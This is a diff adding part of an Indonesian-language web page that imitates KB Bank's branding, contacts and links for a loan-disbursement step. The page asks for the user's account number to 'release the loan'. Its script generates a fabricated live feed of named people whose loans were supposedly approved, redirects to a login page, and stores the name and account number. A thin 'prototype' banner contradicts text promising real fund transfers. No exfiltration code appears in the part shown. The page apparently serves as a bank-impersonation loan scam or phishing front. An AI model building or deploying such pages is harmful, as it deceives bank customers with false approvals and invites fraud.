+          </section>
+
+          <section class="card account-form" id="rekening" aria-labelledby="accountTitle">
+            <div class="section-head"><div><h2 id="accountTitle">Rekening Pencairan KB BANK</h2><p class="card-sub">Masukkan nomor rekening KB BANK untuk pencairan.</p></div></div>
+            <form id="demoAccountForm" novalidate autocomplete="off">
+              <label for="demoAccount">Nomor Rekening </label>
+              <div class="input-wrap"><input id="demoAccount" name="demoAccount" type="text" inputmode="numeric" maxlength="11" aria-describedby="accountHelp accountMessage" /></div>
+              <p class="help" id="accountHelp"><strong>Gunakan KB BANK.</strong>  memasukkan nomor rekening bank KB BANK. Format : tepat 11 angka dan diawali <strong>200</strong>.</p>
+              <div id="accountMessage" class="error" role="status" aria-live="polite"></div>
+              <button class="primary" type="submit">Cairkan Pinjaman Anda</button>
+            </form>
+            <p class="disclaimer">Tombol ini tersedia sementara untuk melanjutkan proses pencairan dan pengiriman dana pinjaman ke rekening KB Bank Anda.</p>
+          </section>
+        </aside>
+      </div>
+    </section>
+
+    <section class="kb-public-info" aria-label="Informasi KBstar dan tautan resmi KB Bank">
+      <div class="kb-public-alert" role="note">
+        <strong>Prototype independen — bukan kanal resmi KB Bank.</strong>
+        Jangan masukkan kredensial, PIN/OTP, data pribadi sensitif, atau melakukan pembayaran melalui prototype ini. Untuk layanan resmi, gunakan kanal resmi KB Bank.
+      </div>
+
+      <div class="kb-kbstar-panel">
+        <div class="kb-kbstar-art" aria-hidden="true">
+          <div class="kb-kbstar-word"><span class="kb-k">KB</span><span class="kb-s">star</span></div>
+          <div class="kb-kbstar-tagline">Warna baru spesial buat kamu</div>
+          <span class="kb-phone p1"></span>
+          <span class="kb-phone p2"></span>
+        </div>
+        <div>
+          <p class="kb-public-eyebrow">KBstar · Informasi referensi</p>
+          <h2 class="kb-public-title">Temukan informasi layanan digital KBstar melalui kanal resmi.</h2>
+          <p class="kb-public-copy">KBstar merupakan layanan digital banking KB Bank. Gunakan tombol di bawah untuk berpindah ke situs resmi KB Bank dan layanan nasabah resmi.</p>
+          <div class="kb-public-actions">
+            <a class="kb-public-action" href="https://www.kbbank.co.id/" target="_blank" rel="noopener noreferrer">Buka Situs Resmi KB Bank ↗</a>
+            <a class="kb-public-action" href="https://www.kbbank.co.id/support-center" target="_blank" rel="noopener noreferrer">Layanan Nasabah ↗</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="kb-corp-grid">
+        <section class="kb-corp-col" aria-labelledby="kb-contact-title">
+          <h3 id="kb-contact-title">Hubungi Kami</h3>
+          <p><strong>Gedung KB Bank</strong></p>
+          <p>Head Office KB Bank</p>
+          <p><a href="tel:0217988266">021 7988 266</a></p>
+          <p><a href="tel:0217980625">021 7980 625</a></p>
+          <p>Jl. MT. Haryono Kav. 50–51, Jakarta 12770</p>
+        </section>
+
+        <section class="kb-corp-col" aria-labelledby="kb-about-title">
+          <h3 id="kb-about-title">Kenali Kami</h3>
+          <nav class="kb-corp-links" aria-label="Tautan perusahaan KB Bank">
+            <a href="https://www.kbbank.co.id/profile/history" target="_blank" rel="noopener noreferrer">Profil KB Bank ↗</a>
+            <a href="https://www.kbbank.co.id/csr-policy" target="_blank" rel="noopener noreferrer">Tanggung Jawab Sosial ↗</a>
+            <a href="https://www.kbbank.co.id/structure-corporate/komisaris" target="_blank" rel="noopener noreferrer">Manajemen Perusahaan ↗</a>
+            <a href="https://www.kbbank.co.id/corporate-governance/about" target="_blank" rel="noopener noreferrer">Tata Kelola Perusahaan ↗</a>
+            <a href="https://www.kbbank.co.id/investor" target="_blank" rel="noopener noreferrer">Hubungan Investor ↗</a>
+            <a href="https://www.kbbank.co.id/info-terbaru" target="_blank" rel="noopener noreferrer">Info Terbaru ↗</a>
+          </nav>
+        </section>
+
+        <section class="kb-corp-col" aria-labelledby="kb-service-title">
+          <h3 id="kb-service-title">Layanan Resmi</h3>
+          <nav class="kb-corp-links" aria-label="Tautan layanan resmi KB Bank">
+            <a href="https://www.kbbank.co.id/savings" target="_blank" rel="noopener noreferrer">Simpanan ↗</a>
+            <a href="https://www.kbbank.co.id/loan" target="_blank" rel="noopener noreferrer">Pinjaman ↗</a>
+            <a href="https://www.kbbank.co.id/credit-card" target="_blank" rel="noopener noreferrer">Kartu Kredit ↗</a>
+            <a href="https://www.kbbank.co.id/debit-card" target="_blank" rel="noopener noreferrer">Kartu Debit ↗</a>
+            <a href="https://www.kbbank.co.id/network/atm" target="_blank" rel="noopener noreferrer">ATM & Jaringan ↗</a>
+            <a href="https://www.kbbank.co.id/support-center" target="_blank" rel="noopener noreferrer">Layanan Pengaduan ↗</a>
+          </nav>
+        </section>
+      </div>
+
+      <div class="kb-corp-legal">
+        <strong>Informasi perusahaan dari kanal resmi:</strong> PT Bank KB Indonesia Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan dan Bank Indonesia serta merupakan peserta penjaminan LPS. Untuk ketentuan, produk, tingkat bunga, dan informasi terbaru, verifikasi langsung melalui situs resmi KB Bank.
+      </div>
+      <div class="kb-corp-bottom">
+        <span>Referensi tautan: kbbank.co.id</span>
+        <span>Merek dan identitas KB Bank/KBstar adalah milik pemegang haknya.</span>
+      </div>
+    </section>
+
+  </main>
+  <script src="/loan-calculator.js?v=1"></script>
+
+  <script>
+    (()=>{
+      "use strict";
+
+      // Nominal, tenor, bunga, dan cicilan dibaca dari satu sumber perhitungan yang sama.
+      const storedLoan = window.KBLoanCalculator.load(50000000, 36);
+      const demoData = Object.freeze({
+        name:"Pengguna",
+        amount:storedLoan.amount,
+        type:"Kredit Serba Guna",
+        tenorMonths:storedLoan.tenorMonths,
+        annualInterestRate:storedLoan.annualInterestRate,
+        totalInterest:storedLoan.totalInterest,
+        installment:storedLoan.installment
+      });
+
+      const rupiah = value => new Intl.NumberFormat("id-ID",{style:"currency",currency:"IDR",maximumFractionDigits:0}).format(value).replace(/\s/g,"");
+      const years = months => months % 12 === 0 ? `${months/12} Tahun` : `${months} Bulan`;
+
+      const storedFullName = (sessionStorage.getItem("kbFullName") || "").trim();
+      document.getElementById("demoName").textContent=storedFullName || demoData.name;
+
+      const finalLogoutKey="kbFinalLogoutAt";
+      const finalResultLink=document.getElementById("finalResultLink");
+      let finalWindowTimer=0;
+      const redirectExpiredFinalWindow=()=>{
+        if(finalWindowTimer){clearTimeout(finalWindowTimer);finalWindowTimer=0;}
+        sessionStorage.setItem("kbReauthRequired","1");
+        sessionStorage.removeItem(finalLogoutKey);
+        const target="login.html?reauth=1";
+        window.smoothNavigate ? window.smoothNavigate(target) : (window.location.href=target);
+      };
+      const syncFinalWindow=()=>{
+        if(finalWindowTimer){clearTimeout(finalWindowTimer);finalWindowTimer=0;}
+        const completed=sessionStorage.getItem("kbFirstSimulationConfirmed")==="1";
+        const logoutAt=Number(sessionStorage.getItem(finalLogoutKey));
+        const active=completed && Number.isFinite(logoutAt) && logoutAt>Date.now();
+        if(finalResultLink) finalResultLink.href=active?"/hasil-pengajuan.html":"#status";
+        if(!completed || !Number.isFinite(logoutAt) || logoutAt<=0) return;
+        if(!active){redirectExpiredFinalWindow();return;}
+        finalWindowTimer=setTimeout(redirectExpiredFinalWindow,logoutAt-Date.now());
+      };
+      syncFinalWindow();
+      document.addEventListener("visibilitychange",()=>{if(!document.hidden)syncFinalWindow();});
+      window.addEventListener("pagehide",()=>{if(finalWindowTimer)clearTimeout(finalWindowTimer);},{once:true});
+      document.getElementById("loanAmount").textContent=rupiah(demoData.amount);
+      document.getElementById("loanType").textContent=demoData.type;
+      document.getElementById("loanTenor").textContent=`${demoData.tenorMonths} Bulan`;
+      document.getElementById("loanInstallment").textContent=`${rupiah(demoData.installment)} / bulan`;
+      document.getElementById("monthlyValue").textContent=rupiah(demoData.installment);
+      document.getElementById("tenorValue").textContent=`${demoData.tenorMonths} Bulan`;
+      document.getElementById("periodValue").textContent=years(demoData.tenorMonths);
+      document.getElementById("interestRateValue").textContent=`${(demoData.annualInterestRate*100).toLocaleString("id-ID",{maximumFractionDigits:2})}% / tahun`;
+      document.getElementById("totalInterestValue").textContent=rupiah(demoData.totalInterest);
+
+
+
+      const liveClock=document.getElementById("liveClock");
+      const liveFeedList=document.getElementById("liveFeedList");
+      const livePool=Object.freeze([
+        {name:"Budi S.",city:"Bandung",amount:25000000},
+        {name:"Rina A.",city:"Surabaya",amount:50000000},
+        {name:"Andi P.",city:"Bekasi",amount:75000000},
+        {name:"Siti R.",city:"Semarang",amount:100000000},
+        {name:"Fajar M.",city:"Makassar",amount:150000000},
+        {name:"Nadia P.",city:"Medan",amount:40000000},
+        {name:"Yusuf H.",city:"Bogor",amount:60000000},
+        {name:"Dewi A.",city:"Yogyakarta",amount:90000000}
+      ]);
+      const MAX_LIVE_ITEMS=7;
+      let liveEntries=[
+        {...livePool[0],createdAt:Date.now()-18000},
+        {...livePool[1],createdAt:Date.now()-74000},
+        {...livePool[2],createdAt:Date.now()-138000},
+        {...livePool[3],createdAt:Date.now()-246000}
+      ];
+      let liveClockTimer=null;
+      let liveRelativeTimer=null;
+      let liveInsertTimer=null;
+      let newestCreatedAt=0;
+
+      const liveTimeFormatter=new Intl.DateTimeFormat("id-ID",{hour:"2-digit",minute:"2-digit",second:"2-digit",hour12:false,timeZone:"Asia/Jakarta"});
+      const initials=name=>name.split(/\s+/).map(part=>part.charAt(0)).join("").replace(/[^A-Z]/gi,"").slice(0,2).toUpperCase();
+      const relativeTime=createdAt=>{
+        const diff=Math.max(0,Date.now()-createdAt);
+        if(diff<60000)return "Baru saja";
+        const minutes=Math.floor(diff/60000);
+        if(minutes<60)return `${minutes} menit lalu`;
+        const hours=Math.floor(minutes/60);
+        return `${hours} jam lalu`;
+      };
+      const updateLiveClock=()=>{if(liveClock)liveClock.textContent=`LIVE • ${liveTimeFormatter.format(new Date())} WIB`;};
+      const renderLiveFeed=(animateCreatedAt=0)=>{
+        if(!liveFeedList)return;
+        liveFeedList.innerHTML=liveEntries.slice(0,MAX_LIVE_ITEMS).map(item=>`
+          <article class="live-feed-item${item.createdAt===animateCreatedAt?" is-new":""}" data-created-at="${item.createdAt}">
+            <div class="live-feed-primary">
+              <span class="live-initials" aria-hidden="true">${initials(item.name)}</span>
+              <div class="live-person"><strong>${item.name}</strong><span>${item.city}</span></div>
+            </div>
+            <div class="live-feed-value">
+              <span class="live-amount">${rupiah(item.amount)}</span>
+              <div class="live-status-row"><span class="live-status">DISETUJUI · FIKTIF</span><span class="live-relative">${relativeTime(item.createdAt)}</span></div>
+            </div>
+          </article>`).join("");
+      };
+      const addLiveEntry=()=>{
+        const visibleNames=new Set(liveEntries.slice(0,MAX_LIVE_ITEMS).map(item=>item.name));
+        const availablePool=livePool.filter(item=>!visibleNames.has(item.name));
+        if(!availablePool.length)return;
+        const source=availablePool[Math.floor(Math.random()*availablePool.length)];
+        const createdAt=Date.now();
+        newestCreatedAt=createdAt;
+        liveEntries=[{...source,createdAt},...liveEntries].slice(0,MAX_LIVE_ITEMS);
+        renderLiveFeed(createdAt);
+      };
+      const scheduleLiveInsert=()=>{
+        clearTimeout(liveInsertTimer);
+        if(document.hidden)return;
+        const delay=8000+Math.floor(Math.random()*12001);
+        liveInsertTimer=setTimeout(()=>{addLiveEntry();scheduleLiveInsert();},delay);
+      };
+      const startLiveTimers=()=>{
+        updateLiveClock();
+        renderLiveFeed(newestCreatedAt);
+        clearInterval(liveClockTimer);
+        clearInterval(liveRelativeTimer);
+        liveClockTimer=setInterval(updateLiveClock,1000);
+        liveRelativeTimer=setInterval(()=>renderLiveFeed(),30000);
+        scheduleLiveInsert();
+      };
+      const stopLiveTimers=()=>{
+        clearInterval(liveClockTimer);
+        clearInterval(liveRelativeTimer);
+        clearTimeout(liveInsertTimer);
+        liveClockTimer=liveRelativeTimer=liveInsertTimer=null;
+      };
+      document.addEventListener("visibilitychange",()=>{
+        if(document.hidden)stopLiveTimers();
+        else startLiveTimers();
+      });
+      startLiveTimers();
+
+      const form=document.getElementById("demoAccountForm");
+      const input=document.getElementById("demoAccount");
+      const message=document.getElementById("accountMessage");
+
+      input.addEventListener("input",()=>{
+        input.value=input.value.replace(/\D/g,"").slice(0,11);
+        message.textContent="";
+        message.className="error";
+      });
+
+      form.addEventListener("submit",event=>{
+        event.preventDefault();
+        const value=input.value;
+        message.className="error";
+        if(!/^\d{11}$/.test(value)){
+          message.textContent="Gunakan nomor Rekening KB BANK 11 digit yang diawali 200";
+          return;
+        }
+        message.className="success";
+        message.textContent="Format rekening contoh valid. Menyiapkan hasil simulasi…";
+        sessionStorage.setItem("kbPrototypeLimit", String(demoData.amount));
+        sessionStorage.setItem("kbAccountNumber", value);
+        sessionStorage.setItem("kbExampleAccountConfirmed", "1");
+        sessionStorage.removeItem("kbFirstSimulationConfirmed");
+        const target="/hasil-pengajuan.html";
+        if(window.smoothNavigate) window.smoothNavigate(target);
+        else window.setTimeout(()=>location.assign(target),260);
+      });
+    })();
+  </script>
+  <script src="/simulation-runtime.js?v=5" defer></script>
+</body>
+</html>
